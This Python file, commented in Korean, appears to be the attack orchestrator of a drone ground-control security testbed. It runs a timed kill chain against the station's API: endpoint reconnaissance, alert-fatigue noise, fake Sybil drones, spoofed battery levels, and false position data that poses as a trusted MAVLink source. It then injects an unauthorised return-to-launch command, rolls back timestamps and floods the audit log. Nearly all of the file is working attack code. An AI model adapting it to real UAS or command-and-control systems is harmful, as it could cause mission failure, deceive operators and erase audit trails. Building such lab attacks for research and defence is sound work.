"""
Coordinated Multi-Vector Blitz — 다중 벡터 동시 공격 오케스트레이터
독창 시나리오 #18 | arXiv:2406.05872 "Coordinated Multi-Vector Attacks on UAS Networks"

이 모듈은 단독 실행도 가능하지만, Docker Compose에서는
기존 공격 컨테이너들을 시간차로 실행하는 것이 권장됨.

단독 실행 시 자체 내장된 축약 버전으로 킬체인을 수행:

킬체인 (단독 오케스트레이터 모드):
  T+0s    무음 정찰 (15개 엔드포인트 열거, 30s)
  T+30s   Alert Fatigue 노이즈 시작 (Phase 1, 45s)
  T+45s   Sybil Fleet 3개 유령 자산 등록 (IDS 과부하)
  T+60s   Battery Crisis 전 자산 동시 급락
  T+75s   FDI Fusion — fused_position 공격자 좌표로 교체
  T+90s   Command Injection — RTL 커맨드 주입 (Alert Fatigue 은폐 상태)
  T+105s  Timestamp Rollback — 사후 트랙 오염
  T+120s  Audit Flood 시작 (감사 로그 로테이션 강제)
"""
from __future__ import annotations

import argparse
import random
import string
import time
from .common import GcsClient, wait_for_gcs


# ── 내장 경량 공격 루틴 ──────────────────────────────────────────────────────

def _recon(client: GcsClient) -> dict:
    """무음 정찰 (30s, 15 엔드포인트)"""
    ENDPOINTS = [
        "/api/health", "/api/scenario", "/api/timeline", "/api/tracks",
        "/api/edge/devices", "/api/commands", "/api/mission-uploads",
        "/api/operation-profile", "/api/alerts", "/api/service-status",
        "/api/summary", "/api/dashboard", "/api/chain",
        "/api/protocol-monitor", "/api/mavlink",
    ]
    intel: dict = {}
    for ep in ENDPOINTS:
        try:
            data = client.get(ep).get("payload", {})
            intel[ep] = data
        except Exception:
            pass
    print(f"[blitz] T+0s RECON 완료 — {len(intel)}/{len(ENDPOINTS)} 엔드포인트 수집", flush=True)
    return intel


def _alert_fatigue_burst(client: GcsClient, n_edges: int = 3, n_ticks: int = 10) -> None:
    """Alert Fatigue 노이즈 버스트 (IDS 임계 경계값 신호 반복)"""
    for tick in range(n_ticks):
        for i in range(n_edges):
            try:
                client.post("/api/telemetry/ingest", {
                    "asset_id":         "small-dronebot-01",
                    "time_s":           tick,
                    "position":         [200.0, -220.0, 95.0],
                    "velocity_mps":     [14.0, 1.2, 0.0],
                    "heading_deg":      0.0,
                    "status":           "edge-live",
                    "source":           "ALERT-NOISE",
                    "source_id":        f"edge-noise-blitz-{i+1:02d}",
                    "source_type":      "uav_edge",
                    "source_authority": "EXTERNAL-ATTACKER",
                    "track_confidence": 0.60 + random.gauss(0, 0.04),
                    "link_quality":     0.30 + random.gauss(0, 0.03),
                    "link_profile":     "rf_degraded",
                    "battery_wh":       690.0,
                })
            except Exception:
                pass
        time.sleep(0.5)
    print(f"[blitz] T+30s ALERT_FATIGUE 버스트 완료 ({n_edges * n_ticks}건)", flush=True)


def _sybil_inject(client: GcsClient, n: int = 3) -> None:
    """유령 자산 n개 주입"""
    prefixes = ["sybil-blitz", "phantom-blitz", "ghost-blitz"]
    for i in range(n):
        sid = f"{prefixes[i % len(prefixes)]}-{''.join(random.choices(string.digits, k=4))}"
        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         sid,
                "time_s":           100,
                "position":         [random.uniform(-300, 300), random.uniform(-300, 300), 80.0],
                "velocity_mps":     [10.0, 5.0, 0.0],
                "heading_deg":      random.uniform(0, 360),
                "status":           "edge-live",
                "source":           "SYBIL-FLEET",
                "source_id":        f"edge-sybil-blitz-{i+1:02d}",
                "source_type":      "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": 0.70,
                "link_profile":     "rf_normal",
                "battery_wh":       500.0,
            })
        except Exception:
            pass
    print(f"[blitz] T+45s SYBIL_FLEET {n}개 유령 자산 등록", flush=True)


def _battery_crisis_all(client: GcsClient) -> None:
    """전 자산 배터리 1.5 Wh 급락"""
    for asset_id in ["small-dronebot-01", "ground-convoy-01"]:
        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         asset_id,
                "time_s":           200,
                "position":         [200.0, -220.0, 95.0],
                "velocity_mps":     [14.0, 1.2, 0.0],
                "heading_deg":      90.0,
                "status":           "edge-live",
                "source":           "BATTERY-CRISIS",
                "source_id":        f"edge-attack-bat-blitz-{asset_id[:3]}",
                "source_type":      "uav_edge" if "dronebot" in asset_id else "ugv_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": 0.85,
                "link_profile":     "rf_spoofed",
                "battery_wh":       1.5,
            })
        except Exception:
            pass
    print("[blitz] T+60s BATTERY_CRISIS 전 자산 battery_wh=1.5 Wh 주입", flush=True)


def _fdi_position_hijack(client: GcsClient) -> None:
    """FDI — fused_position을 공격자 좌표로 교체"""
    decoy_pos = [500.0, -520.0, 20.0]  # 작전 구역 밖
    try:
        client.post("/api/telemetry/ingest", {
            "asset_id":         "small-dronebot-01",
            "time_s":           300,
            "position":         decoy_pos,
            "velocity_mps":     [-5.0, -3.0, -2.0],
            "heading_deg":      225.0,
            "status":           "edge-live",
            "source":           "FDI-FUSION",
            "source_id":        "mavlink-udp-adapter",   # source_registry 위장
            "source_type":      "mavlink_gateway",
            "source_authority": "C2 / Ground Control",
            "track_confidence": 0.97,                   # 최고 신뢰도 → primary 탈취
            "link_profile":     "c2_link",
            "battery_wh":       690.0,
        })
    except Exception:
        pass
    print(f"[blitz] T+75s FDI_FUSION fused_position → {decoy_pos}", flush=True)


def _cmd_inject(client: GcsClient) -> str | None:
    """RTL 커맨드 주입"""
    try:
        resp = client.post("/api/commands/request", {
            "asset_id":     "small-dronebot-01",
            "command_type": "return_to_launch",
            "params":       {"reason": "blitz_attack"},
            "requested_by": "ATTACKER:multi_vector_blitz",
            "priority":     0,
        })
        cid = resp.get("payload", resp).get("command_id")
        print(f"[blitz] T+90s CMD_INJECT RTL 주입 성공 command_id={cid}", flush=True)
        return cid
    except Exception as e:
        print(f"[blitz] CMD_INJECT 오류: {e}", flush=True)
        return None


def _timestamp_rollback(client: GcsClient) -> None:
    """Timestamp Rollback — 사후 트랙 오염"""
    try:
        client.post("/api/telemetry/ingest", {
            "asset_id":         "small-dronebot-01",
            "time_s":           0,   # 에포크 시작값 → age_s 최대화
            "position":         [200.0, -220.0, 95.0],
            "velocity_mps":     [14.0, 1.2, 0.0],
            "heading_deg":      90.0,
            "status":           "edge-live",
            "source":           "TS-ROLLBACK",
            "source_id":        "edge-attack-tsroll-blitz",
            "source_type":      "uav_edge",
            "source_authority": "EXTERNAL-ATTACKER",
            "track_confidence": 0.88,
            "link_profile":     "rf_spoofed",
            "battery_wh":       690.0,
        })
    except Exception:
        pass
    print("[blitz] T+105s TIMESTAMP_ROLLBACK time_s=0 주입 → stale=True", flush=True)


def _audit_flood_burst(client: GcsClient, n: int = 200) -> None:
    """감사 로그 포화 버스트 (로테이션 가속)"""
    for i in range(n):
        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         "small-dronebot-01",
                "time_s":           i % 420,
                "position":         [200.0, -220.0, 95.0],
                "velocity_mps":     [14.0, 1.2, 0.0],
                "heading_deg":      (i * 7) % 360,
                "status":           "edge-live",
                "source":           "AUDIT-FLOOD",
                "source_id":        "edge-audit-blitz",
                "source_type":      "uav_edge",
                "source_authority": "EXTERNAL-ATTACKER",
                "track_confidence": 0.75,
                "link_profile":     "rf_flood",
                "battery_wh":       690.0,
                "padding":          "X" * 1200,
            })
        except Exception:
            pass
    print(f"[blitz] T+120s AUDIT_FLOOD {n}건 주입 — 로테이션 가속 중", flush=True)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Multi-Vector Blitz 오케스트레이터")
    parser.add_argument("--service-url", default="http://dah-gcs:8080")
    parser.add_argument("--duration-s",  type=float, default=180.0,
                        help="총 공격 지속 시간 (s, 기본 3분)")
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(
        "=" * 60 + "\n"
        "[blitz] ★★★ MULTI-VECTOR BLITZ 시작 ★★★\n"
        "  킬체인: Recon → AlertFatigue → Sybil → BatteryCrisis\n"
        "          → FDI → CmdInject → TsRollback → AuditFlood\n" +
        "=" * 60,
        flush=True,
    )

    t0 = time.time()

    def elapsed() -> float:
        return time.time() - t0

    def wait_until(target_s: float) -> None:
        remaining = target_s - elapsed()
        if remaining > 0:
            time.sleep(remaining)

    # T+0s: 정찰
    intel = _recon(client)

    wait_until(5.0)

    # T+5s: Alert Fatigue 버스트 시작 (10틱 × 3엣지)
    _alert_fatigue_burst(client, n_edges=3, n_ticks=10)

    wait_until(20.0)

    # T+20s: Sybil Fleet
    _sybil_inject(client, n=3)

    wait_until(30.0)

    # T+30s: Battery Crisis
    _battery_crisis_all(client)

    wait_until(40.0)

    # T+40s: FDI Fusion
    _fdi_position_hijack(client)
    # FDI 지속 (10틱 반복)
    for _ in range(10):
        _fdi_position_hijack(client)
        time.sleep(1.0)

    wait_until(60.0)

    # T+60s: Command Injection
    cmd_id = _cmd_inject(client)

    wait_until(70.0)

    # T+70s: Timestamp Rollback
    _timestamp_rollback(client)

    wait_until(80.0)

    # T+80s: Audit Log Flood
    _audit_flood_burst(client, n=300)

    # 나머지 시간: Alert Fatigue 지속으로 경보 목록 유지
    while elapsed() < args.duration_s:
        _alert_fatigue_burst(client, n_edges=2, n_ticks=3)
        time.sleep(3.0)

    print(
        f"\n[blitz] ★★★ MULTI-VECTOR BLITZ 종료 ★★★\n"
        f"  총 경과: {elapsed():.0f}s\n"
        f"  수집 정보: {list(intel.keys())[:5]}...\n"
        f"  Command ID: {cmd_id}\n"
        f"  기대 결과: 운용자 상황인식 붕괴, IDS 포화, 임무 실패",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
